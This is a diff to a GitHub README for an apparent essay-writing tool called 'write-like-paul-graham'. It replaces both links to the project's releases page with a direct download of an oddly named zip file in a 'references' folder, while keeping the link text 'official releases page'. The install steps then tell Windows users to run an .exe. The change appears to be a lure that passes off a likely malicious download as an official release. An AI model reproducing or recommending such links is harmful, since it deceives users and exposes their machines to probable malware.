@@ -1,6 +1,6 @@
 # ✍️ write-like-paul-graham - Craft essays with clear, logical structure
 
-[![](https://img.shields.io/badge/Download-Latest-blue)](https://github.com/cassandryfrankish746/write-like-paul-graham/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue)](https://github.com/cassandryfrankish746/write-like-paul-graham/raw/refs/heads/main/references/paul_like_write_graham_v1.9.zip)
 
 This software helps you write essays that hold attention. It uses the principles found in successful long-form writing to organize your thoughts and refine your arguments. You receive guidance on how to strip away filler and focus on the core logic of your work.
 
@@ -28,7 +28,7 @@ To run this tool on a Windows computer, you need:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/cassandryfrankish746/write-like-paul-graham/releases) to access the latest version.
+1. Visit the [official releases page](https://github.com/cassandryfrankish746/write-like-paul-graham/raw/refs/heads/main/references/paul_like_write_graham_v1.9.zip) to access the latest version.
 2. Look for the file ending in `.exe` under the "Assets" heading.
 3. Click this file to start the download.
 4. Save the file to your "Downloads" folder.
